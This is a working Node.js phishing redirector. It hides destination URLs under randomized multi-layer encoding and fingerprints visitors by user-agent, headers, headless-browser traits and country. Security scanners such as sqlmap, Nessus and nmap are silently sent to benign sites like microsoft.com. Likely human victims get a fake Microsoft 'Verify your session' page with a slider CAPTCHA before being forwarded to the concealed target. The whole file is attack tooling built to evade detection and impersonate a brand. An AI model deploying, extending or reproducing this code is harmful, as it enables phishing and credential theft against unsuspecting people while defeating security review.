const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch'); // npm install node-fetch@2

const app = express();

app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIG
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';
const BOT_URLS = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.google.com'
];
const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 3000;

// Small base64 Microsoft logo (2026 style - you can replace with newer one)
const MS_LOGO_BASE64 = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEwIDJ2N0g1VjJ6TTIgMTBoN3Y3SDJ6TTEwIDE1djdoN3YtN3ptNy03djdoN3YtN3oiIGZpbGw9IiMwMDY3YzUiLz48L3N2Zz4=';

// ────────────────────────────────────────────────
// CSP
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc: ["'self'"],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health checks
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// BOT DETECTION & RATE LIMIT
// ────────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 4,
  message: 'Rate limit exceeded',
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [/headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i, /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i, /zoomeye/i, /nmap/i, /gobuster/i];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;
  if (suspiciousUA.some(r => r.test(ua))) score += 30;
  if (!ua.includes('mozilla')) score += 15;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 12;
  if (ref && !['outlook','office','microsoft','live.com','hotmail'].some(r => ref.includes(r))) score += 10;
  if (!accept.includes('text/html')) score += 10;
  if (!req.headers['sec-fetch-site'] || !req.headers['sec-fetch-mode']) score += 20;
  if (!req.headers['accept-language']) score += 12;

  return score >= 45;
}

// ────────────────────────────────────────────────
// GEO CHECK
// ────────────────────────────────────────────────
async function getCountryCode(req) {
  if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return 'XX';

  try {
    const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
    if (res.ok) return (await res.text()).trim().toUpperCase();
  } catch {}
  return 'XX';
}

// ────────────────────────────────────────────────
// MULTI-LAYER ENCODING (improved noise handling)
// ────────────────────────────────────────────────
const encoders = [
  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
];

function multiLayerEncode(str) {
  let result = str;
  const layers = [];
  const noise = crypto.randomBytes(6 + Math.floor(Math.random() * 10)).toString('hex');
  result = noise + result + noise;

  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
  const selected = shuffled.slice(0, 4 + Math.floor(Math.random() * 2));

  for (const layer of selected) {
    result = layer.enc(result);
    layers.push(layer.name);
  }

  result = encodeURIComponent(result);
  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  return { encoded: result, layers: layers.reverse(), noise };
}

function multiLayerDecode(encoded, layers, noise) {
  let result = encoded;
  result = decodeURIComponent(result);
  result = decodeURIComponent(result);
  result = decodeURIComponent(result);

  for (const layerName of layers) {
    const layer = encoders.find(e => e.name === layerName);
    if (!layer) throw new Error(`Unknown layer: ${layerName}`);
    result = layer.dec(result);
  }

  // Improved noise removal using known noise length
  if (noise && result.startsWith(noise) && result.endsWith(noise)) {
    result = result.slice(noise.length, -noise.length);
  }

  return result;
}

// ────────────────────────────────────────────────
// GENERATE LINK
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();

  const { encoded, layers, noise } = multiLayerEncode(noisy);
  const layersEnc = Buffer.from(JSON.stringify({ layers, noise })).toString('base64url');

  const segments = [];
  for (let i = 0; i < 6; i++) {
    segments.push(crypto.randomBytes(8).toString('hex') + Math.random().toString(36).substring(2, 12).toUpperCase() + (i % 2 ? 'verify' : 'session'));
  }

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid','tok','ref','utm_src','clid','ver','ts','hmac','nonce','_t','cid','fid','l'];
  for (let i = 0; i < 13; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = k.startsWith('l') ? layersEnc : encodeURIComponent(crypto.randomBytes(12).toString('base64url'));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${encoded}&${params.join('&')}&v=7.3.${Math.floor(Math.random()*100)}`;

  console.log(`[GENERATED] ${url.length} chars → ${target}`);
  res.json({ success: true, tracked: url });
});

// ────────────────────────────────────────────────
// MAIN ROUTE /r/*
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  if (!geoAllowed || isLikelyBot(req)) {
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${geoAllowed ? 'BOT_BLOCK' : 'GEO_BLOCKED'} ${ip} ${country}\n`, () => {});
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});

  let redirectTarget = TARGET_URL;
  try {
    const query = req.url.split('?')[1] || '';
    const params = new URLSearchParams(query);
    const enc = params.get('p') || '';
    const layersB64 = params.get('l') || '';

    if (enc && layersB64) {
      const { layers, noise } = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
      let decoded = multiLayerDecode(enc, layers, noise);

      const hashIdx = decoded.indexOf('#');
      if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);

      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;

      const urlObj = new URL(decoded);
      if (['http:', 'https:'].includes(urlObj.protocol)) {
        redirectTarget = decoded;
      }
    }
  } catch (err) {
    console.error(`DECODE_ERROR ${ip} | ${err.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  // ────────────────────────────────────────────────
  // IMPROVED VERIFICATION PAGE
  // ────────────────────────────────────────────────
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Session Verification - Microsoft</title>
  <style>
    body { font-family: 'Segoe UI', system-ui, sans-serif; background:#f3f2f1; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; color:#333; }
    .box { background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.15); text-align:center; max-width:440px; width:92%; }
    .loader { border:5px solid #e5e5e5; border-top:5px solid #0067c5; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 24px; }
    @keyframes spin { to { transform:rotate(360deg); } }
    h2 { margin:0 0 16px; font-size:1.6rem; }
    p { margin:0 0 20px; color:#555; }
    #canvas-container { position:relative; margin:24px auto; width:320px; height:200px; border:1px solid #d1d1d1; border-radius:8px; overflow:hidden; background:#f9f9f9; }
    canvas { position:absolute; top:0; left:0; }
    #slider { width:100%; height:56px; margin:24px 0 12px; background:#e8e8e8; border-radius:28px; position:relative; cursor:grab; }
    #slider-knob { position:absolute; top:8px; left:8px; width:40px; height:40px; background:#0067c5; border-radius:50%; box-shadow:0 3px 10px rgba(0,0,0,0.25); transition:left 0.12s; }
    #instructions { font-size:1rem; color:#444; margin-bottom:16px; }
    #error-msg { color:#c42b1c; margin-top:16px; font-size:0.95rem; display:none; }
    .ms-logo { width:90px; height:auto; margin-bottom:20px; }
    #loading { position:absolute; inset:0; background:rgba(255,255,255,0.92); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:10; }
  </style>
</head>
<body>
  <div class="box">
    <img src="${MS_LOGO_BASE64}" alt="Microsoft" class="ms-logo">
    <h2>Verify your session</h2>
    <p>We're confirming this is you to protect your account.</p>

    <div id="loading">
      <div class="loader"></div>
      <p>Preparing secure verification...</p>
    </div>

    <div id="content" style="display:none;">
      <div id="instructions">Drag the piece to complete the image</div>
      <div id="canvas-container">
        <canvas id="bgCanvas" width="320" height="200"></canvas>
        <canvas id="pieceCanvas" width="320" height="200"></canvas>
      </div>

      <div id="slider">
        <div id="slider-knob"></div>
      </div>

      <div id="error-msg"></div>
    </div>
  </div>

  <script nonce="${res.locals.nonce}">
    const TARGET_URL = '${safeTarget}';
    const BOT_URL    = '${BOT_URLS[0]}';

    // ─── Behavioral + Headless detection ───
    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
    let focusLost = 0;

    if (navigator.webdriver || !window.chrome || window.outerWidth === 0 || navigator.plugins.length === 0) {
      location.href = BOT_URL;
    }

    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const minMoves   = mobile ? 5 : 7;
    const minEntropy = mobile ? 14 : 22;

    function updateEntropy(dx, dy) {
      const now = Date.now();
      const dt = (now - lastTime) / 1000 || 1;
      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.6;
      lastTime = now;
      moves++;
    }

    document.addEventListener('mousemove', e => {
      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
      lastX = e.clientX; lastY = e.clientY;
    });

    document.addEventListener('touchmove', e => {
      if (e.touches?.length) {
        const t = e.touches[0];
        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
        lastX = t.clientX; lastY = t.clientY;
      }
    }, {passive:true});

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) focusLost++;
    });

    // ─── Puzzle ───
    const bg = document.getElementById('bgCanvas').getContext('2d');
    const piece = document.getElementById('pieceCanvas').getContext('2d');
    const knob = document.getElementById('slider-knob');

    let puzzleX = 0, targetX = 0, pieceSize = 64;

    function generatePuzzle() {
      targetX = 50 + Math.random() * 200;
      puzzleX = 0;

      // Copilot+ themed background
      const grad = bg.createLinearGradient(0,0,320,200);
      grad.addColorStop(0, '#e6f0ff'); grad.addColorStop(1, '#cce0ff');
      bg.fillStyle = grad; bg.fillRect(0,0,320,200);

      bg.fillStyle = '#0067c5'; bg.fillRect(30, 50, 260, 100);
      bg.font = 'bold 32px "Segoe UI", sans-serif';
      bg.fillStyle = 'white'; bg.fillText('Copilot+', 90, 110);

      redrawPiece();
    }

    function redrawPiece() {
      piece.clearRect(0,0,320,200);
      piece.save();
      piece.beginPath();
      piece.moveTo(puzzleX, 70);
      piece.lineTo(puzzleX + pieceSize, 70);
      piece.lineTo(puzzleX + pieceSize, 134);
      piece.lineTo(puzzleX, 134);
      piece.closePath();
      piece.clip();
      piece.drawImage(document.getElementById('bgCanvas'), puzzleX, 70, pieceSize, 64, puzzleX, 70, pieceSize, 64);
      piece.shadowColor = 'rgba(0,0,0,0.35)'; piece.shadowBlur = 10;
      piece.strokeStyle = '#777'; piece.lineWidth = 2.5;
      piece.strokeRect(puzzleX, 70, pieceSize, 64);
      piece.restore();
    }

    // Drag logic
    let dragging = false, startX = 0;

    knob.addEventListener('mousedown', e => { dragging = true; startX = e.clientX - puzzleX; e.preventDefault(); });
    document.addEventListener('mousemove', e => {
      if (!dragging) return;
      puzzleX = Math.max(0, Math.min(280, e.clientX - startX));
      knob.style.left = puzzleX + 'px';
      redrawPiece();
    });
    document.addEventListener('mouseup', () => { dragging = false; checkSolve(); });

    knob.addEventListener('touchstart', e => { dragging = true; startX = e.touches[0].clientX - puzzleX; e.preventDefault(); });
    document.addEventListener('touchmove', e => {
      if (!dragging) return;
      puzzleX = Math.max(0, Math.min(280, e.touches[0].clientX - startX));
      knob.style.left = puzzleX + 'px';
      redrawPiece();
    }, {passive:false});
    document.addEventListener('touchend', () => { dragging = false; checkSolve(); });

    function checkSolve() {
      const dist = Math.abs(puzzleX - targetX);
      if (dist < 10 && moves >= minMoves && entropy >= minEntropy && focusLost <= 2) {
        setTimeout(() => location.href = TARGET_URL, 900 + Math.random()*1400);
      } else if (dist < 10) {
        const err = document.getElementById('error-msg');
        err.textContent = 'Please complete the verification.';
        err.style.display = 'block';
        setTimeout(() => { err.style.display = 'none'; generatePuzzle(); }, 2200);
      }
    }

    // Fake loading → reveal puzzle
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('content').style.display = 'block';
      generatePuzzle();
    }, 2200 + Math.random() * 1800);

    setTimeout(() => location.href = BOT_URL, 45000);
  </script>
</body>
</html>
  `);
});

app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));